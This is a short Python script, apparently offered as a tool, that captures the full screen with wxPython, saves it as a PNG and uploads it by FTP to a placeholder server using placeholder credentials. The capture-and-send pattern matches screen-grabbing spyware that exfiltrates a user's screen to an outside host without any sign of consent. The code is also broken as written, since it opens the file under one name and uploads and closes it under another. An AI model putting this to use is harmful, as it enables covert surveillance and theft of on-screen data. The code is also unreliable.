#!/usr/bin/python3

# Tool for gabbing screen shots using WX Python

# import modules
import wx
import os 
import ftplib

# Call to WX App
w = wx.App()

# Call to Screen DC 
screen = wx.ScreenDC()

# Screen Shot size 
size = screen.GetSize()

bmap = wx.Bitmap(size[0], size[1])

# Memory device context 
memo = wx.MemoryDC(bmap)

# Set x and y coordinates to 0
memo.Blit(0, 0, size[0], size[1], screen, 0, 0)

del memo
bmap.SaveFile('grabbed.png', wx.BITMAP_TYPE_PNG)

# Create FTP Session
sess_ = ftplib.FTP("<FTP SERVER ADDRESS>", "<username>", "<password>")

file = open("grabbed.png", "rb")
sess_.storbinary("STOR /tmp/grabbed.png", file_)

# Close File, Close FTP Session
file_.close()
sess_.quit()

